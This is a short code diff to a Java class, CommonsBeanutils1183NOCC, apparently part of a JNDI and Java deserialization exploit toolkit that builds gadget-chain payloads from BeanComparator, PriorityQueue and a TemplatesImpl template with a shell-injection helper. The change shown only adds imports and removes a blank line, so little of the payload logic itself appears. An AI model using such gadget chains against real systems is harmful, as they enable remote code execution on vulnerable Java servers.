@@ -4,10 +4,14 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.annotation.Dependencies;
 import com.nu1r.jndi.gadgets.utils.Gadgets;
 import com.nu1r.jndi.gadgets.utils.Reflections;
+import com.nu1r.jndi.gadgets.utils.Serializer;
+import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.commons.beanutils.BeanComparator;
 
+import java.io.ByteArrayOutputStream;
+import java.util.Arrays;
 import java.util.PriorityQueue;
 
 import static com.nu1r.jndi.gadgets.utils.InjShell.insertField;
@@ -18,7 +22,6 @@ public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object template = Gadgets.createTemplatesImpl(type, param);
-
         ClassPool pool    = ClassPool.getDefault();
         CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
 
